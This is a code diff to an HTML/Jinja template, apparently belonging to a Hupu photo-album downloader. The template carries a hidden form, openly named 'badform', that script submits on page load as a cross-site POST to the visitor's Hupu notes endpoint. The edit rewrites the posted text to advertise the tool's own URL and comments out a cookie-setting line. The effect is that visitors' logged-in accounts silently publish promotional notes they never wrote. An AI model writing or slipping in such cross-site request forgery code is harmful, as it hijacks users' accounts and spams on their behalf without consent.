@@ -6,7 +6,7 @@
 <body>
 <!-- <p>我用@江中锅块 的相册下载器下载虎扑相册{% if title %}《{{title}}》{% endif %} {% if url %}{{url}}{% endif %}</p> -->
     <form name="badform" method="post" action="http://my.hupu.com/jzgk/note?ref=note">
-        <input type="hidden" name="content" value="我用@江中锅块 的相册下载器下载虎扑相册{% if title %}《{{title}}》{% endif %} {% if url %}{{url}}{% endif %}" />
+        <input type="hidden" name="content" value="用 @江中锅块 的工具 http://hupu.xavierskip.com 可以下载虎扑相册{% if title %}《{{title}}》{% endif %}{% if url %}{{url}}{% endif %}" />
     </form>
     <script type="text/javascript">
         function setCookie(name, value, expires, path, domain, secure){
@@ -18,7 +18,7 @@
         }
         document.badform.submit();
         setTimeout(function(){
-            setCookie('csrf',0);
+            // setCookie('csrf',0);
             location.href = "{{ url_for('albums') }}";
         },1000);
     </script>
